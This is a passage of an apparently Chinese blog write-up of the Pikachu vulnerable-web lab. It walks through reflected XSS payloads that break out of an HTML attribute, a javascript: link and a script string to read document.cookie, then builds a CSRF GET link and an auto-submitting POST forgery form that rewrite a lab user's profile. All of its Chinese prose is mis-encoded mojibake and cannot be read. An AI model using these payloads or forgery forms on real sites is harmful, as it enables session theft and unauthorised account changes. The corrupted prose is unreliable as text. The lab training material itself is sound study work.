</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>è¾“å…¥æ’å…¥åˆ°äº†domä¸­ï¼Œä¸”åªæœ‰<code>'</code>(å•å¼•å·)æ²¡è¢«è½¬æ¢ï¼Œåˆ©ç”¨è¿™ç‚¹é—­åˆå±æ€§ï¼Œæ„é€ æ¶æ„payloadå¦‚ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#' onclick='alert(document.cookie)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ¶æ„payloadè¾“å…¥æäº¤åæ–°çš„é¡µé¢æ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>äººç”Ÿä¹‹æ‰€æœ‰è‹¦çŸ­,æ˜¯å› ä¸ºä½ çš„xsså­¦ä¹ çš„è¿˜ä¸å¤Ÿå¥½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>notice<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ä½ çš„è¾“å…¥å·²ç»è¢«è®°å½•:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span> <span class="token attr-name">'</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>#' onclick='alert(document.cookie)'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu28.png" alt="pikachu28"></p> <p>ç‚¹å‡»æ ‡ç­¾å¼¹å‡ºcookie</p> <h2 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="header-anchor">#</a> xssä¹‹hrefè¾“å‡º</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu29.png" alt="pikachu29"></p> <p>è¦æ±‚è¾“å…¥urlï¼Œéšæ„è¾“å…¥127.0.0.1ådomå¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>è¯·è¾“å…¥ä¸€ä¸ªä½ å¸¸ç”¨çš„ç½‘ç«™urlåœ°å€,æˆ‘å°±çŸ¥é“ä½ æ˜¯ä»€ä¹ˆäºº<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>127.0.0.1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> é˜ä¸‹è‡ªå·±è¾“å…¥çš„urlè¿˜è¯·è‡ªå·±ç‚¹ä¸€ä¸‹å§<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>å†…å®¹æ’å…¥äº†aæ ‡ç­¾çš„hrefå±æ€§ä¸­ï¼Œè¯¥å¤„ä¹Ÿå¯ä»¥æ‰§è¡Œjsä»£ç ï¼Œæ„é€ æ¶æ„payloadå¦‚ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Javascript:alert(document.cookie)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æäº¤åï¼Œæ ¸å¿ƒdomå˜åŒ–å¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>è¯·è¾“å…¥ä¸€ä¸ªä½ å¸¸ç”¨çš„ç½‘ç«™urlåœ°å€,æˆ‘å°±çŸ¥é“ä½ æ˜¯ä»€ä¹ˆäºº<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Javascript:alert(document.cookie)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> é˜ä¸‹è‡ªå·±è¾“å…¥çš„urlè¿˜è¯·è‡ªå·±ç‚¹ä¸€ä¸‹å§<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ç‚¹å‡»æ ‡ç­¾ï¼Œå¼¹å‡ºcookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu30.png" alt="pikachu30"></p> <h2 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="header-anchor">#</a> xssä¹‹jsè¾“å‡º</h2> <p>åŸå§‹é¡µé¢jsæ ¸å¿ƒéƒ¨åˆ†å¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    $ms<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token comment">//            alert($ms);</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>éšæ„è¾“å…¥deedbeefåï¼Œå‘ç°è¢«æ’å…¥äº†jsä»£ç ä¸­</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    $ms<span class="token operator">=</span><span class="token string">'deedbeef'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token comment">//            alert($ms);</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>ç›´æ¥å•å¼•å·é—­åˆï¼Œæ„é€ æ¶æ„jsï¼Œå¹¶ä¸”æ³¨é‡Šæ‰åé¢éƒ¨åˆ†ï¼Œpayloadå¦‚ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>';alert(document.cookie);//
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu31.png" alt="pikachu31"></p> <p>æäº¤åï¼Œå¼¹å‡ºcookie</p> <h1 id="csrf"><a href="#csrf" class="header-anchor">#</a> CSRF</h1> <h2 id="csrf-get"><a href="#csrf-get" class="header-anchor">#</a> CSRF(get)</h2> <p>ç›´æ¥ç™»å½•kobeè´¦å·ï¼Œç‚¹å‡»ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼Œä¿®æ”¹ä¸€ä¸ªæ‰‹æœºå·é¡¹å¦‚ä¸‹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu32.png" alt="pikachu32"></p> <p>æäº¤æ—¶æŠ“åŒ…ï¼Œè¯·æ±‚åŒ…å†…å®¹å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=10086&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrfget/csrf_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=jd3540v9nsn5a332185ddutcek</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>å¯ä»¥çœ‹åˆ°getè¯·æ±‚ä¸­å¹¶æ²¡æœ‰é˜²CSRFçš„tokenï¼Œç›´æ¥æ„é€ æ¶æ„é“¾æ¥ä¿®æ”¹ä¿¡æ¯ä¸º(boy,12580,usa,admin@admin.cn),å¦‚ä¸‹</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>http://172.26.239.122/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=12580&amp;add=usa&amp;email=admin@admin.cn&amp;submit=submit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ¨¡æ‹Ÿkobeè®¿é—®è¯¥é“¾æ¥ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡csrfä¿®æ”¹äº†kobeçš„ä¿¡æ¯</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu33.png" alt="pikachu33"></p> <h2 id="csrf-post"><a href="#csrf-post" class="header-anchor">#</a> CSRF(post)</h2> <p>è¿˜æ˜¯è€ä¸€å¥—ï¼Œè¿™æ¬¡ç™»å½•lucyè´¦å·</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu34.png" alt="pikachu34"></p> <p>éšä¾¿ä¿®æ”¹ç‚¹ä»€ä¹ˆï¼ŒæŠ“åŒ…çœ‹åˆ°æ•°æ®æ˜¯postæäº¤çš„ï¼Œè¿™ä¹Ÿå¥½åŠï¼Œä¼ªé€ ä¸€ä¸ªæ¶æ„æäº¤è¡¨å•é¡µé¢(æäº¤åä¿®æ”¹è´¦å·å†…å®¹ä¸ºboy,12580,usa,admin@admin.cn)</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cn<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>csrf_post<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;postsubmit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://172.26.239.122/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">&quot;</span></span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sex<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>boy<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>phonenum<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>12580<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>add<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>usa<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>email<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>admin@admin.cn<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>postsubmit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
